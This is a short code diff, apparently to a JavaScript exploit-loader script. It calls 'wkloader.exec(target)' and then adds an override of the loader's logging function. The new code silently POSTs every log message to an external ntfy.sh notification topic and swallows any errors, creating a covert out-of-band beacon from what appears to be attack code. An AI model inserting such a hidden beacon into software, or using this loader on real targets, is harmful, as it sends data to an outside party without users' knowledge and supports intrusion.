@@ -312,3 +312,14 @@ function run() {
     wkloader.exec(target);
     wkloader.log("exec returned");
 }
+
+// ntfy progress beacon override
+wkloader.log = function(message) {
+    console.log("[*] " + message);
+    try {
+        var nx = new XMLHttpRequest();
+        nx.open("POST", "https://ntfy.sh/carbon4s-jawji-7f3k9q", true);
+        nx.setRequestHeader("Content-Type", "text/plain");
+        nx.send(message);
+    } catch (e) {}
+};
